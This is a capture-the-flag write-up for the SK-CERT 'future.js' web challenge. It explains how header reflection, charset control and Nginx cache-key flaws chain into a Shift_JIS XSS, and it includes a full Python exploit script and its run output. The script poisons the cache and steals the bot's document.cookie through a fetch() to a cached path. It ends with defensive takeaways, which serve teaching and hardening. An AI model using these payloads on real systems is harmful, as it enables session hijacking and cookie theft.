# future.js — SK-CERT CTF Writeup

**Author:** Senpai  
**Category:** Web Exploitation  
**Points:** 500  
**Flag:** `SK-CERT{seriously_why??????}`

---

## Challenge Description

> *"Can you sonic out the flag? Looks like tardis' translator is broken."*

A Next.js application sits behind an Nginx reverse proxy with a Puppeteer bot that stores the flag in a cookie and visits attacker-supplied URLs. The goal is to exfiltrate `document.cookie` from the bot's browser context.

---

## Environment

| Component | Role |
|---|---|
| **Next.js app** | `app/`, `middleware.ts`, `app/layout.tsx` |
| **Nginx** | Reverse proxy + aggressive cache for `/_next/*` |
| **Bot** | Puppeteer service (`bot/server.js`) — visits attacker URLs as admin |

**Critical bot behavior:**

```javascript
// bot/server.js
await page.setCookie({
  name:     'flag',
  value:    FLAG,
  url:      CHALLENGE_URL,   // http://proxy:4000
  path:     '/',
  httpOnly: false,           // ← readable by JavaScript!
})
```

`httpOnly: false` means `document.cookie` exposes the flag to any JavaScript running on `http://proxy:4000`.

---

## Root Cause Analysis

There are four independent vulnerabilities that chain together.

### 1. Content-Type Reflection (charset poisoning)

`middleware.ts` mirrors the request's `Content-Type` header directly into the response:

```typescript
const contentType = getContentTypeFromHeader(request.headers.get('content-type'))
if (contentType) {
  response.headers.set('Content-Type', contentType)
}
```

Sending `Content-Type: text/html; charset=Shift_JIS` in the request forces the response to carry `charset=Shift_JIS`, which controls how the browser interprets the page's bytes.

### 2. Nonce Reflection into HTML

`app/layout.tsx` embeds the `x-nonce` request header verbatim into the rendered HTML:

```tsx
const nonce = headerStore.get('x-nonce') || undefined
<body nonce={nonce}>{children}</body>
```

An attacker fully controls the string that lands inside the `nonce="..."` attribute — and by extension, the surrounding HTML.

### 3. Shared Cache Namespace

Nginx's cache key for `/_next/*`:

```nginx
proxy_cache_key "$request_method|$scheme://$host$request_uri";
```

The upstream `Host` header is normalized to `$host` (port stripped):

```nginx
proxy_set_header Host $host;
```

This means an attacker sending `Host: proxy` and the bot visiting `http://proxy:4000/...` resolve to **the same cache key** — attacker-poisoned entries are served to the bot.

### 4. Cache ignores upstream headers

```nginx
proxy_cache_valid any 5m;
proxy_ignore_headers Cache-Control Expires Set-Cookie;
```

Nginx caches every response status for 5 minutes regardless of what the app says, making poisoned entries persist.

---

## The Attack Chain

```
Attacker                  Nginx Cache               Bot (Puppeteer)
   │                           │                          │
   │── GET /_next/xss3-<ts> ──►│                          │
   │   Host: proxy              │                          │
   │   Content-Type: Shift_JIS  │                          │
   │   x-nonce: <payload>       │──► Next.js (MISS)        │
   │                            │◄── poisoned HTML ────────│
   │◄── 200 CT=Shift_JIS ───────│    cached 5min           │
   │                            │                          │
   │── POST /bot/visit ─────────┼──────────────────────────►│
   │   url: http://proxy:4000/  │                          │
   │        _next/xss3-<ts>     │                          │
   │                            │◄── GET /_next/xss3-<ts> ─│
   │                            │    (cache HIT → poisoned) │
   │                            │──► Shift_JIS page ───────►│
   │                            │                          │ XSS fires!
   │                            │◄── GET /_next/exf3-<ts> ─│
   │                            │    x-nonce: document.cookie
   │                            │──► Next.js reflects      │
   │                            │    cookie into nonce attr │
   │                            │    cached 5min           │
   │                            │                          │
   │── GET /_next/exf3-<ts> ───►│                          │
   │◄── HIT: nonce=flag=SK-CERT{...}                       │
```

---

## The Shift_JIS Breakout (Why `\x81` Matters)

The nonce value ends up serialized inside an HTML attribute. To break out of it and inject JavaScript, we need to escape the surrounding quotes. React/Next.js escapes `"` as `\"` in attribute values — the backslash is `\x5C`.

Under **Shift_JIS**, two-byte sequences consume the second byte:

| Lead byte | + `\x5C` | JIS X 0208 result | Backslash consumed? |
|---|---|---|---|
| `\x82` | `\x82\x5C` | Undefined (decoder error) | ❌ `\x5C` not consumed |
| `\x81` | `\x81\x5C` | U+2015 HORIZONTAL BAR `―` | ✅ `\x5C` consumed |

When `\x81\x5C` is decoded as one valid character, the `\x5C` backslash that was escaping the `"` gets swallowed — the quote becomes unescaped and breaks out of the attribute string. This is the classic **Shift_JIS quote-escape bypass**.

**Crafted nonce payload:**

```python
nonce = '\x81"]);fetch(\'/_next/exf3-<ts>\',{headers:{\'x-nonce\':document.cookie}});//'
```

When the browser decodes this page as Shift_JIS, `\x81"` becomes `―"` — the quote escapes the attribute, the injected `fetch()` runs, and the bot's cookie is sent as the `x-nonce` header of the exfil request.

---

## Exploit Script

```python
#!/usr/bin/env python3
# future.js — SK-CERT CTF
# Author: Senpai

import requests
import re
import time

TARGET  = "http://46.62.153.171:4000"
BOT_AE  = "gzip, deflate"

AE_VARIANTS = [
    "gzip, deflate",
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
]

def run_exploit():
    ts         = int(time.time())
    xss_path   = f"/_next/xss3-{ts}"
    exfil_path = f"/_next/exf3-{ts}"
    js_payload = f"fetch('{exfil_path}',{{headers:{{'x-nonce':document.cookie}}}})"

    # \x81\x5C is a valid Shift_JIS two-byte sequence (U+2015 ―)
    # It consumes the backslash that Next.js uses to escape the closing quote,
    # leaving the " unescaped and breaking out of the nonce attribute.
    nonce = f'\x81"]);{js_payload};//'

    print(f"[*] XSS path:   {xss_path}")
    print(f"[*] Exfil path: {exfil_path}")
    print(f"[*] JS payload: {js_payload}\n")

    # Step 1 — Poison cache for all Accept-Encoding variants
    print("[1] Poisoning cache variants...")
    for ae in AE_VARIANTS:
        r = requests.get(
            f"{TARGET}{xss_path}",
            headers={
                "Host":            "proxy",
                "Accept-Encoding": ae,
                "Content-Type":    "text/html; charset=Shift_JIS",
                "x-nonce":         nonce,
            },
            allow_redirects=False,
        )
        ct    = r.headers.get("Content-Type", "")
        cache = r.headers.get("X-Proxy-Cache", "?")
        ok    = "✓" if "Shift_JIS" in ct else "✗"
        print(f"    {ok} AE='{ae}': {cache}, CT={ct}")
    print()

    # Step 2 — Verify poisoned entry is a HIT
    print("[2] Verifying cache...")
    r = requests.get(
        f"{TARGET}{xss_path}",
        headers={"Host": "proxy", "Accept-Encoding": BOT_AE},
        allow_redirects=False,
    )
    print(f"    Cache: {r.headers.get('X-Proxy-Cache')}")
    print(f"    CT:    {r.headers.get('Content-Type')}\n")

    # Step 3 — Send bot to poisoned URL
    print("[3] Sending bot to poisoned URL...")
    bot_url = f"http://proxy:4000{xss_path}"
    r = requests.post(f"{TARGET}/bot/visit", json={"url": bot_url}, timeout=30)
    print(f"    Response: {r.status_code} {r.json()}\n")

    # Step 4 — Wait for XSS to execute
    print("[4] Waiting 10 seconds for XSS execution...")
    time.sleep(10)
    print()

    # Step 5 — Read exfil from cache
    print("[5] Reading exfil cache...")
    for ae in AE_VARIANTS + ["gzip", "deflate", "br", "identity", ""]:
        headers = {"Host": "proxy"}
        if ae:
            headers["Accept-Encoding"] = ae
        r = requests.get(f"{TARGET}{exfil_path}", headers=headers, allow_redirects=False)
        if r.headers.get("X-Proxy-Cache") == "HIT":
            m = re.search(r"SK-CERT\{[^}]+\}", r.text)
            if m:
                print(f"    [+] FLAG FOUND (AE='{ae}'): {m.group(0)}")
                return m.group(0)
            m2 = re.search(r'nonce="([^"]*)"', r.text)
            if m2 and m2.group(1):
                print(f"    HIT (AE='{ae}'): nonce='{m2.group(1)[:100]}'")

    return None


def main():
    print("=" * 60)
    print(" future.js exploit — Shift_JIS cache poisoning XSS")
    print("=" * 60 + "\n")
    flag = run_exploit()
    if flag:
        print(f"\n{'='*60}\n FLAG: {flag}\n{'='*60}")
    else:
        print("\n[!] No flag found. XSS may not have fired.")


if __name__ == "__main__":
    main()
```

---

## Run Output

```
============================================================
 future.js exploit — Shift_JIS cache poisoning XSS
============================================================

[*] XSS path:   /_next/xss3-1778671746
[*] Exfil path: /_next/exf3-1778671746
[*] JS payload: fetch('/_next/exf3-1778671746',{headers:{'x-nonce':document.cookie}})

[1] Poisoning cache variants...
    ✓ AE='gzip, deflate': MISS, CT=text/html; charset=Shift_JIS
    ✓ AE='gzip, deflate, br': MISS, CT=text/html; charset=Shift_JIS
    ✓ AE='gzip, deflate, br, zstd': MISS, CT=text/html; charset=Shift_JIS

[2] Verifying cache...
    Cache: HIT
    CT:    text/html; charset=Shift_JIS

[3] Sending bot to poisoned URL...
    Response: 200 {'status': 'visited'}

[4] Waiting 10 seconds for XSS execution...

[5] Reading exfil cache...
    [+] FLAG FOUND (AE='gzip, deflate'): SK-CERT{seriously_why??????}

============================================================
 FLAG: SK-CERT{seriously_why??????}
============================================================
```

---

## Key Takeaways

**Never reflect request headers into response Content-Type.** Allowing a client to dictate `charset=Shift_JIS` on a response is what makes the entire chain possible. The browser's character decoder becomes a weapon.

**Cache key design is a security boundary.** Stripping the port from `Host` before constructing the cache key collapsed two distinct trust domains — the public attacker and the internal bot — into the same namespace. Any attacker-controlled request can pre-populate entries the bot will consume.

**Multi-byte charset confusion is a classical XSS primitive.** Shift_JIS has been used to bypass quote escaping since the early 2000s. The `\x81\x5C` technique works because the lead byte "claims" the following `\x5C` (backslash) as the second byte of a two-byte character, neutralizing the escape. Modern apps that set `charset=utf-8` explicitly are immune — here the charset was attacker-controlled.

**Cache as an out-of-band exfil channel.** The bot cannot make outbound requests to attacker infrastructure, but it can make requests to the same Nginx proxy the attacker can read. Exfiltrating via a cacheable path is a clean way to bridge the gap without needing a listener.

---

*Writeup by Senpai · SK-CERT CTF*
